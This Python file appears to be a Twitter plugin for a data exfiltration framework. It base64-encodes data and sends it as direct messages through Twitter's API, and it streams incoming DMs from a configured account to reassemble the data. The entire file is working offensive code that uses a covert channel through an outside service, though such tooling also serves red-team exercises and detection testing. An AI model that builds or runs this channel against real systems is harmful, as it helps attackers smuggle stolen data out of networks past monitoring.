from tweepy import Stream
from tweepy import OAuthHandler
from tweepy import API
from tweepy.streaming import StreamListener
import base64
import json

api = None
auth = None
app_exfiltrate = None
config = None


class StdOutListener(StreamListener):

    def on_data(self, status):
        try:
            data = json.loads(status)
            if data['direct_message'] and data['direct_message']['sender_screen_name'] == config['username']:
                try:
                    data_to_retrieve = base64.b64decode(data['direct_message']['text'].encode()).decode()
                    app_exfiltrate.log_message(
                        'ok', "Retrieved a packet from Twitter of {0} bytes".format(len(data_to_retrieve)))
                    app_exfiltrate.retrieve_data(data_to_retrieve)
                except Exception as e:
                    print(e)
                    pass
        except:
            # app_exfiltrate.log_message('warning', "Could not manage to decode message")
            pass


def start_twitter():
    global api
    global auth

    auth = OAuthHandler(config['consumer_token'], config['consumer_secret'])
    auth.secure = True
    auth.set_access_token(config['access_token'],
                          config['access_token_secret'])
    api = API(auth)


def send(data):
    global api
    if (not api):
        start_twitter()
    api.send_direct_message(user=config['username'], text=base64.b64encode(data.encode()).decode())


def listen():
    start_twitter()
    try:
        app_exfiltrate.log_message('info', "[twitter] Listening for DMs...")
        stream = Stream(auth, StdOutListener())
        stream.userstream()
    except Exception as e:
        app_exfiltrate.log_message(
            'warning', "[twitter] Couldn't listen for Twitter DMs".format(e))

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [twitter] proxy mode unavailable (useless) for twitter plugin...")

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app.register_plugin('twitter', {'send': send, 'listen': listen, 'proxy': proxy})
        app_exfiltrate = app
